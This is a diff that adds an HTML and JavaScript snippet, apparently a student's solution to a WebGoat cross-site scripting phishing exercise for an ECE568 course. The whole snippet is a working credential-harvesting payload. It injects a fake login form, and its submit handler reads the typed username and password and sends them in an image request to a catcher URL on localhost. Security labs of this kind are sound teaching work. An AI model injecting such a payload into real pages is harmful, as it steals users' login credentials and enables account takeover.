@@ -1,0 +1,18 @@
+</form>
+<script>
+	function part1(){
+		
+		username = document.getElementById("ece568-2019f-user").value;
+		password = document.getElementById("ece568-2019f-pass").value;
+		attack = new Image();
+		attack.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishUser="+username+"&phishPass="+password+"";
+		
+	}
+</script>
+
+<form id="fs">
+	ece568-2019f-user: <input id = "ece568-2019f-user" type="text" /></br>
+	ece568-2019f-pass: <input id = "ece568-2019f-pass" type="password" /></br>
+	<input id = "ece568-2019f-submit" type="submit" onclick="part1()" />
+</form>
+
